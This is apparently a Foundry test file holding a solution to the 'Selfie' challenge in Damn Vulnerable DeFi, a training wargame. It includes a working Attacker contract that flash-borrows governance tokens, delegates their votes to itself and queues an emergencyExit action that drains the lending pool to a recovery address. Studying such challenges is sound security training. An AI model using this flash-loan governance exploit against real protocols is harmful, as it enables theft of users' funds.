// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {ISimpleGovernance} from "../../src/selfie/ISimpleGovernance.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {Votes} from "@openzeppelin/contracts/governance/utils/Votes.sol";

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        Attacker attacker = new Attacker(address(pool), recovery, address(governance), token);
        uint256 actionId = attacker.attack();
        // Execute the queued action after the delay
        vm.warp(block.timestamp + ISimpleGovernance(governance).getActionDelay());
        ISimpleGovernance(governance).executeAction(actionId);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}

contract Attacker is IERC3156FlashBorrower {
    address public pool;
    address public recovery;
    address public governance;
    IERC20 public governanceToken;
    uint256 public actionId;
    constructor(
        address _pool,
        address _recovery,
        address _governance,
        IERC20 _governanceToken
    ) {
        pool = _pool;
        recovery = _recovery;
        governance = _governance;
        governanceToken = _governanceToken;
    }

    function attack() external returns (uint256) {
        SelfiePool(pool).flashLoan(
            this,
            address(governanceToken),
            SelfiePool(pool).maxFlashLoan(address(governanceToken)),
            ""
        );     
        return actionId;    
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data) external override returns (bytes32) {
        
        console.log("Token Balance ",IERC20(token).balanceOf(address(this)));
        Votes(token).delegate(address(this));
        // Add a governance action to queue that calls emergencyExit on the pool
        actionId = ISimpleGovernance(governance).queueAction(
            pool,
            0,
            abi.encodeWithSignature("emergencyExit(address)", recovery)
        );

        // Approve to repay the loan
        IERC20(token).approve(pool, amount + fee);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
